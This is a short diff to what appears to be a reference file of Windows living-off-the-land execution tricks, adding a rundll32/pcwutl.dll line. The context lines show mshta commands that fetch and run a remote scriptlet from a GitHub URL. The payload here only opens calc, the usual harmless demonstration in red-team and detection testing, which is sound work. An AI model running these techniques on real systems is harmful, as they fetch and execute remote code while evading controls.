@@ -19,3 +19,6 @@ mshta.exe javascript:a=GetObject("script:https://raw.githubusercontent.com/lostt
 
 ### Download and Display the Payload
 mshta https://raw.githubusercontent.com/losttroll/runcalc/main/calc.sct
+
+## RunDLL32.exe
+rundll32.exe pcwutl.dll,LaunchApplication C:\Windows\System32\calc.exe
